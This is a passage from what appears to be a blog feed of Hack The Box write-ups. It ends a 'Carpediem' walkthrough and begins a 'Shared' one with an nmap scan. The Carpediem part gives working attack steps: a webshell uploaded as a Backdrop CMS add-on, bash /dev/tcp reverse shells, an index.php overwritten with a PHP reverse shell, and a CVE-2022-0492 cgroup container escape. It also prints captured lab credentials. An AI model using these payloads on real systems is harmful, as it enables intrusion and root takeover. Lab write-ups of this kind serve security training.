<p>Then, I can open the <em>pcap</em> file and see the <em>decrypted data</em>:</p>
<p><img src="wireshark_click_open.png" alt="Wireshark Click Open"></p>
<p><img src="choose_pcap_wireshark.png" alt="Choose File Wireshark"></p>
<p>Right away, I can spot a <em>POST</em> request for <em>login</em> page, and if I inspect it, I can see the credentials <em>jpardella:tGPN6AmJDZwYWdhY</em>.</p>
<p><img src="getting_credentials.png" alt="Getting New Credentials"></p>
<h3 id="accessing-backdrop-from-kali">Accessing Backdrop From Kali</h3>
<p>Again, using <em>Chisel</em>, I&rsquo;ll forward the port to my machine:</p>
<p><img src="upload_chisel_hflaccus.png" alt="Upload Chisel"></p>
<ul>
<li>On kali:
<pre tabindex="0"><code>./chisel_1.7.7_linux_amd64 server -p 9001 --reverse
</code></pre></li>
<li>On the target:
<pre tabindex="0"><code>./chisel_1.7.7_linux_amd64 client 10.10.16.23:9001 R:127.0.0.1:8080:172.17.0.2:443 &amp;
</code></pre></li>
</ul>
<p><img src="forward_backdrop.png" alt="Forward 443 backdrop"></p>
<p>Now, I am able to access backdrop from kali on <em>https://localhost:8080/</em>:</p>
<p><img src="access_backdrop_from_kali.png" alt="Accessing Backdrop"></p>
<p>Since, I have credentials for this site, I can try to login and upload a malicious <em>php</em> file to get <em>RCE</em> on the container:</p>
<p><img src="login_backdrop.png" alt="Login Backdrop"></p>
<h3 id="getting-rce-on-backdrop-container">Getting RCE On Backdrop Container</h3>
<p>The way to upload a malicious <em>php</em> file is by uploading a malicious add-on with crafted php file, as described here: <em>

<a href="https://www.exploit-db.com/exploits/50323" target="_blank">https://www.exploit-db.com/exploits/50323</a></em>. Although <em>Cross Site Request Forgery</em> isn&rsquo;t needed here because I am already logged in, but I can use the step to upload a malicious <em>.tar</em> file containing my php code as add-on, and gain <em>RCE</em> that way.</p>
<p>Link to the malicious tar file is <em>

<a href="https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/download/backdrop/reference.tar" target="_blank">https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/download/backdrop/reference.tar</a></em>.</p>
<p><img src="link_to_malicious_tar_file.png" alt="Link To Malicious Tar File"></p>
<p>So, after downloading the file to my machine, I can list its contents to make sure everything is correct using <code>tar -tf references.tar</code>:</p>
<p><img src="list_tar_contents.png" alt="List Tar Contents"></p>
<p>And now I can upload it to <em>backdrop</em> as add-on:</p>
<p><img src="click_install_module_backdrop.png" alt="Click Install Module Backdrop"></p>
<p><img src="click_manual_installation_backdrop.png" alt="Click Manual Installation Backdrop"></p>
<p><img src="upload_tar_file_backdrop.png" alt="Upload Tar File Backdrop"></p>
<p><img src="click_install_backdrop.png" alt="Click Install Backdrop"></p>
<p>After that, I can access the shell and run my malicious commands from here: <em>https://localhost:8080/modules/reference/shell.php?cmd=id</em></p>
<p><img src="run_id_backdrop.png" alt="Run ID Backdrop"></p>
<p>In order to get a reverse shell, I need to know the ip address of <em>docker</em> interface since there is no route to my machine from docker, so I&rsquo;ll catch a shell from <em>hflaccus</em> user:</p>
<p><img src="get_docker_ip.png" alt="Get Docker Ip address"></p>
<p>Using <code>curl</code> and a payload like this, I can trigger the reverse shell:</p>
<pre tabindex="0"><code>curl -k -s https://localhost:8080/modules/reference/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/172.17.0.1/1234%200%3E%261%27

# url encoded payload: bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/172.17.0.1/1234%200%3E%261%27
# url decoded payload: bash -c &#39;bash -i &gt;&amp; /dev/tcp/172.17.0.1/1234 0&gt;&amp;1&#39; 
</code></pre><p><img src="getting_reverse_shell_backdrop_hflaccus.png" alt="Getting Reverse Shell Backdrop"></p>
<h2 id="escalating-to-root">Escalating To Root</h2>
<h3 id="finding-cronjobs-executed-by-root">Finding Cronjobs Executed By Root</h3>
<p>If run the command <code>ps aux</code>, I can see that root user is executing some scripts:</p>
<p><img src="seeing_root_running_scripts_docker.png" alt="Root Executes Some Scripts Docker"></p>
<p><img src="reading_cron_job_script.png" alt="Reading The Scripts"></p>
<p>This script is checking the integrity of <em>/var/www/html/backdrop/core/scripts/backdrop.sh</em> and executes it by providing some parameters.</p>
<p>Reading the file to see what it does, reveals that the script takes a <em>URI</em> parameter and requests <em>index.php</em> from that <em>URI</em> and then executes it, which means that since root user is providing <em>https://localhost</em> uri where I have write permission to its files, I can override <em>index.php</em> and add my malicious script to escalate to root.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">cat</span> <span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">www</span><span style="color:#f92672">/</span><span style="color:#a6e22e">html</span><span style="color:#f92672">/</span><span style="color:#a6e22e">backdrop</span><span style="color:#f92672">/</span><span style="color:#a6e22e">core</span><span style="color:#f92672">/</span><span style="color:#a6e22e">scripts</span><span style="color:#f92672">/</span><span style="color:#a6e22e">backdrop</span><span style="color:#f92672">.</span><span style="color:#a6e22e">sh</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env php
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">/**
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Backdrop shell execution script
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Check for your PHP interpreter - on Windows you&#39;ll probably have to
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * replace line 1 with
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *   #!c:/program files/php/php.exe
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * @param path  Backdrop&#39;s absolute root directory in local file system (optional).
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * @param URI   A URI to execute, including HTTP protocol prefix.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> */</span>
</span></span><span style="display:flex;"><span>$script <span style="color:#f92672">=</span> <span style="color:#a6e22e">basename</span>(<span style="color:#a6e22e">array_shift</span>($_SERVER[<span style="color:#e6db74">&#39;argv&#39;</span>]));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>(<span style="color:#e6db74">&#39;--help&#39;</span>, $_SERVER[<span style="color:#e6db74">&#39;argv&#39;</span>]) <span style="color:#f92672">||</span> <span style="color:#66d9ef">empty</span>($_SERVER[<span style="color:#e6db74">&#39;argv&#39;</span>])) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&lt;&lt;&lt;</span><span style="color:#e6db74">EOF</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Execute a Backdrop page from the shell.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Usage:        {$script} [OPTIONS] &#34;&lt;URI&gt;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Example:      {$script} &#34;http://mysite.org/node&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">All arguments are long options.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  --help      This page.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  --root      Set the working directory for the script to the specified path.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              To execute Backdrop this has to be the root directory of your
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              Backdrop installation, f.e. /home/www/foo/backdrop (assuming
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              Backdrop is running on Unix). Current directory is not required.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              Use surrounding quotation marks on Windows.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  --verbose   This option displays the options as they are set, but will
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              produce errors from setting the session.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  URI         The URI to execute, i.e. http://default/foo/bar for executing
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              the path &#39;/foo/bar&#39; in your site &#39;default&#39;. URI has to be
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              enclosed by quotation marks if there are ampersands in it
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              (f.e. index.php?q=node&amp;foo=bar). Prefix &#39;http://&#39; is required,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              and the domain must exist in Backdrop&#39;s sites-directory.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              If the given path and file exists it will be executed directly,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              i.e. if URI is set to http://default/bar/foo.php
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              and bar/foo.php exists, this script will be executed without
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              bootstrapping Backdrop. To execute Backdrop&#39;s cron.php, specify
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              http://default/core/cron.php as the URI.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">To run this script without --root argument invoke it from the root directory
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">of your Backdrop installation with
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ./scripts/{$script}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">\n
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">EOF</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// define default settings
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;index.php&#39;</span>;
</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#39;HTTP_HOST&#39;</span>]       <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;default&#39;</span>;
</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#39;PHP_SELF&#39;</span>]        <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/index.php&#39;</span>;
</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>]     <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>;
</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#39;SERVER_SOFTWARE&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">NULL</span>;
</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>]  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;GET&#39;</span>;
</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#39;QUERY_STRING&#39;</span>]    <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#39;PHP_SELF&#39;</span>]        <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REQUEST_URI&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/&#39;</span>;
</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#39;HTTP_USER_AGENT&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;console&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// toggle verbose mode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>(<span style="color:#e6db74">&#39;--verbose&#39;</span>, $_SERVER[<span style="color:#e6db74">&#39;argv&#39;</span>])) {
</span></span><span style="display:flex;"><span>  $_verbose_mode <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>  $_verbose_mode <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// parse invocation arguments
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">while</span> ($param <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_shift</span>($_SERVER[<span style="color:#e6db74">&#39;argv&#39;</span>])) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> ($param) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;--root&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// change working directory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      $path <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_shift</span>($_SERVER[<span style="color:#e6db74">&#39;argv&#39;</span>]);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_dir</span>($path)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">chdir</span>($path);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($_verbose_mode) {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;cwd changed to: </span><span style="color:#e6db74">{</span>$path<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">ERROR: </span><span style="color:#e6db74">{</span>$path<span style="color:#e6db74">}</span><span style="color:#e6db74"> not found.</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">substr</span>($param, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;--&#39;</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ignore unknown options
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// parse the URI
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $path <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_url</span>($param);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// set site name
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($path[<span style="color:#e6db74">&#39;host&#39;</span>])) {
</span></span><span style="display:flex;"><span>          $_SERVER[<span style="color:#e6db74">&#39;HTTP_HOST&#39;</span>] <span style="color:#f92672">=</span> $path[<span style="color:#e6db74">&#39;host&#39;</span>];
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// set query string
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($path[<span style="color:#e6db74">&#39;query&#39;</span>])) {
</span></span><span style="display:flex;"><span>          $_SERVER[<span style="color:#e6db74">&#39;QUERY_STRING&#39;</span>] <span style="color:#f92672">=</span> $path[<span style="color:#e6db74">&#39;query&#39;</span>];
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">parse_str</span>($path[<span style="color:#e6db74">&#39;query&#39;</span>], $_GET);
</span></span><span style="display:flex;"><span>          $_REQUEST <span style="color:#f92672">=</span> $_GET;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// set file to execute or Backdrop path (clean URLs enabled)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($path[<span style="color:#e6db74">&#39;path&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">file_exists</span>(<span style="color:#a6e22e">substr</span>($path[<span style="color:#e6db74">&#39;path&#39;</span>], <span style="color:#ae81ff">1</span>))) {
</span></span><span style="display:flex;"><span>          $_SERVER[<span style="color:#e6db74">&#39;PHP_SELF&#39;</span>] <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REQUEST_URI&#39;</span>] <span style="color:#f92672">=</span> $path[<span style="color:#e6db74">&#39;path&#39;</span>];
</span></span><span style="display:flex;"><span>          $cmd <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($path[<span style="color:#e6db74">&#39;path&#39;</span>], <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elseif</span> (<span style="color:#a6e22e">isset</span>($path[<span style="color:#e6db74">&#39;path&#39;</span>])) {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;q&#39;</span>])) {
</span></span><span style="display:flex;"><span>            $_REQUEST[<span style="color:#e6db74">&#39;q&#39;</span>] <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;q&#39;</span>] <span style="color:#f92672">=</span> $path[<span style="color:#e6db74">&#39;path&#39;</span>];
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// display setup in verbose mode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> ($_verbose_mode) {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Hostname set to: </span><span style="color:#e6db74">{</span>$_SERVER[<span style="color:#e6db74">&#39;HTTP_HOST&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Script name set to: </span><span style="color:#e6db74">{</span>$cmd<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Path set to: </span><span style="color:#e6db74">{</span>$_GET[<span style="color:#e6db74">&#39;q&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_exists</span>($cmd)) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">include</span> $cmd;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">ERROR: </span><span style="color:#e6db74">{</span>$cmd<span style="color:#e6db74">}</span><span style="color:#e6db74"> not found.</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">exit</span>();
</span></span></code></pre></div><h3 id="getting-root-inside-container">Getting Root Inside Container</h3>
<p>First, I&rsquo;ll get a full <em>TTY</em> shell (fully interactive shell) using <code>script</code> command since python3 isn&rsquo;t installed in the container:</p>
<pre tabindex="0"><code>script -qc /bin/bash /dev/null
[CTRL + z]
stty raw -echo ; fg
[Enter]
</code></pre><p><img src="get_full_TTY.png" alt="Get Full TTY"></p>
<p>Then, I&rsquo;ll override <em>index.php</em> inside backdrop directory with a php reverse shell back to <em>hflaccus</em> on the host target which is listening on port <em>6666</em>:</p>
<p><code>echo '&lt;?php system(&quot;/bin/bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.17.0.1/6666 0&gt;&amp;1\&quot;&quot;) ?&gt;' &gt; backdrop/index.php</code></p>
<p><img src="getting_root_in_docker.png" alt="Getting Root Shell Docker"></p>
<p>Again, I&rsquo;ll get a full <em>TTY</em> shell:</p>
<p><img src="getting_full_TTY_docker_root.png" alt="Getting Full TTY Shell Root"></p>
<h3 id="listing-docker-capabilities">Listing Docker Capabilities</h3>
<p>Now, if I try to list the <em>capabilities</em> for this container:</p>
<pre tabindex="0"><code>cat /proc/$$/status | grep CapEff
capsh --decode=00000000a00425fb
</code></pre><p><img src="seeing_capabilities_docker.png" alt="List Docker Capabilities"></p>
<h3 id="finding-cve-2022-0492-to-escape-docker">Finding CVE-2022-0492 To Escape Docker</h3>
<p>I can&rsquo;t see something that can be abused here, however, a recent vulnerability 

<a href="https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/" target="_blank"><em>CVE-2022-0492</em></a> has been discovered that allows us to get all the capabilities back and then abuse <em>cgroups</em> to escape from the container and get root on the host:</p>
<p><code>unshare -UrmC bash</code></p>
<p><img src="getting_all_caps_back.png" alt="Getting All Caps Back"></p>
<p><code>mount -t cgroup -o rdma cgroup /mnt</code></p>
<p><img src="mount_worked.png" alt="Mount Worked"></p>
<h3 id="getting-root-on-carpediem">Getting Root On Carpediem</h3>
<p>Mounting <em>cgroup</em> has worked, so now I&rsquo;ll abuse that to escape from docker and make <em>root</em> execute a reverse shell back to hflaccus listening on port <em>9696</em>:</p>
<pre tabindex="0"><code>mkdir /mnt/x
echo 1 &gt; /mnt/x/notify_on_release
host_path=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab`
echo &#34;$host_path/cmd&#34; &gt; /mnt/release_agent
echo &#39;#!/bin/sh&#39; &gt; /cmd
echo &#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/172.17.0.1/9696 0&gt;&amp;1&#34;&#39; &gt;&gt; /cmd
chmod a+x /cmd
sh -c &#34;echo \$\$ &gt; /mnt/x/cgroup.procs&#34;
</code></pre><p><img src="getting_root_carpediem.png" alt="Getting Root Carpediem"></p>
]]></content>
        </item>
        
        <item>
            <title>Shared Write-Up</title>
            <link>https://mostxeon.github.io/posts/shared/</link>
            <pubDate>Fri, 11 Nov 2022 21:01:23 +0200</pubDate>
            
            <guid>https://mostxeon.github.io/posts/shared/</guid>
            <description>false</description>
            <content type="html"><![CDATA[<h2 id="initial-recon">Initial Recon</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p- -A 10.10.11.172
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-11-12 17:03 EET
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> shared.htb <span style="color:#f92672">(</span>10.10.11.172<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65423</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>, <span style="color:#ae81ff">109</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
</span></span><span style="display:flex;"><span>22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 91e835f4695fc2e20e2746e2a6b6d865 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> cffcc45d84fb580bbe2dad35409dc351 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> a3386d750964ed70cf17499adc126d11 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp  open  http     nginx 1.18.0
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">81</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| /*?order<span style="color:#f92672">=</span> /*?tag<span style="color:#f92672">=</span> /*?id_currency<span style="color:#f92672">=</span> /*?search_query<span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span>| /*?back<span style="color:#f92672">=</span> /*?n<span style="color:#f92672">=</span> /*&amp;order<span style="color:#f92672">=</span> /*&amp;tag<span style="color:#f92672">=</span> /*&amp;id_currency<span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span>| /*&amp;search_query<span style="color:#f92672">=</span> /*&amp;back<span style="color:#f92672">=</span> /*&amp;n<span style="color:#f92672">=</span> /*controller<span style="color:#f92672">=</span>addresses 
</span></span><span style="display:flex;"><span>|_/*controller<span style="color:#f92672">=</span>address /*controller<span style="color:#f92672">=</span>authentication
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to https://shared.htb/
</span></span><span style="display:flex;"><span>443/tcp open  ssl/http nginx 1.18.0
</span></span><span style="display:flex;"><span>| tls-nextprotoneg: 
</span></span><span style="display:flex;"><span>|   h2
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>| tls-alpn: 
</span></span><span style="display:flex;"><span>|   h2
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>|_http-trane-info: Problem with XML parsing of /evox/about
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>*.shared.htb/organizationName<span style="color:#f92672">=</span>HTB/stateOrProvinceName<span style="color:#f92672">=</span>None/countryName<span style="color:#f92672">=</span>US
</span></span><span style="display:flex;"><span>| Not valid before: 2022-03-20T13:37:14
</span></span><span style="display:flex;"><span>|_Not valid after:  2042-03-15T13:37:14
</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">81</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| /*?order<span style="color:#f92672">=</span> /*?tag<span style="color:#f92672">=</span> /*?id_currency<span style="color:#f92672">=</span> /*?search_query<span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span>| /*?back<span style="color:#f92672">=</span> /*?n<span style="color:#f92672">=</span> /*&amp;order<span style="color:#f92672">=</span> /*&amp;tag<span style="color:#f92672">=</span> /*&amp;id_currency<span style="color:#f92672">=</span> 
